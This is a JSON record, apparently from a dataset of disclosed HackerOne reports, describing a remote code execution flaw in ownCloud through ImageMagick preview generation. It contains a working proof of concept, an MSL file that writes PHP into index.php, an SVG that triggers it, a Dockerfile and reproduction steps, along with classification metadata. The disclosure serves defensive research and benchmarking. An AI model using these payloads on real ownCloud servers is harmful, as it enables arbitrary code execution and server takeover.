@@ -1,0 +1,59 @@
+{
+    "reported_to": "ownCloud",
+    "reported_by": "lukasreschke ",
+    "title": "Remote Code Execution on ownCloud instances with ImageMagick installed",
+    "content": "\nIt is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using OC\\Preview\\Bitmap)\nThe prerequisite for exploitation seem to be:\nImageMagick is installed (e.g. as described in the ownCloud documentation)\nThe attacker knows the file path of a file that they uploaded (e.g. /mnt/data/files/)\nThe attacker is able to upload files to the system (e.g. by using File Drop Folders or having an account)\nTo reproduce we have provided the following files:\nDockerfile (F2127559)\nCode 79 Bytes\n1FROM owncloud/server:10.11\n2RUN apt-get update && apt-get install -y imagemagick\nexploit.msl (F2127558)\nCode 313 Bytes\n1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n2<image> \n3  <read filename=\"/mnt/data/files/admin/files/Photos/Portugal.jpg\" />\n4  <get width=\"base-width\" height=\"base-height\" />\n5  <resize geometry=\"400x400\" />\n6  <comment>&lt;?php echo php_uname(); ?&gt;</comment>\n7  <write filename=\"/var/www/owncloud/index.php\" />\n8</image>\nimage.rgb (F2127557)\nCode 217 Bytes\n1<svg width=\"1000\" height=\"1000\" \n2xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n3xmlns=\"http://www.w3.org/2000/svg\">       \n4<image xlink:href=\"msl:/mnt/data/files/admin/files/exploit.msl\" height=\"500\" width=\"500\"/>\n5</svg>\nDownload these files and then perform the following steps:\nBuild the docker image\ndocker build . -t owncloud-imagemagick\ndocker build . -t owncloud-imagemagick\nStart the docker image\ndocker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest\ndocker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest\nOpen the ownCloud instance at localhost:8080 and login using the username \u201cadmin\u201d and the password \u201cadmin\u201d.\nUpload the file exploit.msl\nUpload the file image.rgb\nUpload the file exploit.msl\nUpload the file image.rgb\nReload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)\n<image_0>\nImpact\nAttackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 250,
+    "weaknesses": [
+        "Code Injection"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/slwdvamrj9jmylkcm3nng6th8i4w?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-01-19_00.05.46.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-01-19_00.05.46.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSYNEIXS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T001716Z&X-Amz-Expires=525&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID34EjFczoP1AjX9wTcrwX01Xh5LYwoYOnMQLlFVYWIdAiBbpQJSkWEQhhnP3zcCVWrbrTi80fcQqNnBE8AA5rSIESq7BQjz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMcwXVHg4YyWhz8TFvKo8FtD4c5BjMeV125K1w41MsQxaE1Z5piY%2BWYCLuJ8C9JHEMnMYc3et02nod3A%2BV%2FBSXZdbnE5ZvakUuemlcfJMPCy0qgJgN3skRaRmIN1j10kqsgeZd0Yn4nNcUA2cSIjqArKICHRDMnNN6bE5GQvWFLG3FZC%2FlFNUfhfQjqs08gAkby3R4JiEzxQqu5K%2B1vft1i8pQKsRwVopPhvRiib7qlOtVmRTavaSuxo%2Fkk1ZufJPA0TJoaUbc0GnZQKEQFeh2VovdSQ4Kam2yPUX8bZMHUWdcZiy%2BDvomf%2BnHVVkH2Lxr0y35m6siQOhGyu%2Fh%2BdOGGWcUqKa9Q%2B4NGLChKi98JfXJsEEDN7uyg%2FF1ZooLggIR3erogeGigVX2On22hhXFTBl0%2FgPm0i9WzK2NkZUOaN%2FG%2FODK1pLJrTj7lQDO0pbGEzWGtCxE0NnVUizsZ3d43936aiXwE0DBS00hgTuOs1ueqt%2FiZTip0cRns7WVtQyGRvCrldyrIubIKnRXPrMxGTYM2kezEn1UFC6Xd8YYWXzZeb%2FoodNtNHg7Ej%2BbuAhVCx7lDf8gLQiBZeriKB0ozSTuH8%2FndYVkG7YnrkDnjqmwf8lEDBHlVcZQURxTD4Ga%2BBpMZlcwjtoZmxL6tgFhRgbIqRzV42DjMCvOXRPiT9tMqR%2BYFAnJMshgnQPmPCdJxnmFaHOUEvTqJGZcta73Wu6OL3S8Bq9qmdbNTNWcVGCIuad53Hdwy70ISiTxN47Gyna1m4smeriDZN%2B%2FdqrD%2FFCfKhzWIY7XidizbSbUT%2B43QALV2taxtJOXsp1gC7oxOM%2FuxqZizYF3buHt9JgpoEsIfPsaKDzMdxUGIhJFiUICpXbmWigsg4j%2FwFoSJDCPuoa%2FBjqyAS78m2TJbVWqb8BNA%2F73N%2FLA63wIYtada0tGJZOhUibVMnsoUL1s6ymAhEPtcjyeVzTXVNSB0J3%2BiIIEahreNu5Cj8GeEwW1jfNps%2BL3Fp2E%2Bh%2FFoRQCh0J%2FjnTQ%2FpOunsHejVL1BL0uGcuniNEYPtmoBs2jlO%2FU6SplGcVe2tKr%2BVg12L5eAMdUMEkSIlphDSSfMKrC6teFB%2F1%2FzdPIgIijpFXu6ca%2F80iTNr3GVaFgiIM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=65f71c062d0e5a3ea8dde4caac90a1beeb01bf666c1fe88cd0af949a2a7f8463"
+    },
+    "disclosed_date": 1681330440,
+    "report_url": "https://hackerone.com/reports/1838674",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Build the docker image with ImageMagick installed: `docker build . -t owncloud-imagemagick`"
+        ],
+        [
+            2,
+            "Start the docker container: `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`"
+        ],
+        [
+            3,
+            "Log in to the ownCloud instance at localhost:8080 using username 'admin' and password 'admin'"
+        ],
+        [
+            4,
+            "Upload the files `exploit.msl` and `image.rgb` to the ownCloud instance"
+        ],
+        [
+            5,
+            "Reload the page to trigger the exploit, which rewrites `index.php` with arbitrary PHP code"
+        ]
+    ],
+    "vuln_description": "A remote code execution vulnerability exists in ownCloud instances with ImageMagick installed. Attackers can exploit this by uploading specially crafted files (MSL and SVG) that trigger ImageMagick to overwrite PHP files with malicious code when generating previews.",
+    "reason": "This vulnerability requires understanding of multiple components (ImageMagick's MSL format, SVG file handling, and ownCloud's preview generation) and their subtle interaction. The attack chain is non-obvious, involving file uploads triggering a server-side image processing vulnerability that leads to file writes.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The vulnerability involves an attacker uploading files to an ownCloud instance with ImageMagick installed, which is a specific configuration and not a general authentication or authorization bypass. The methodology described focuses on testing different user sessions and resource IDs within the same application, not on file upload vulnerabilities or specific server configurations.",
+        "is_detectable": false
+    }
+}
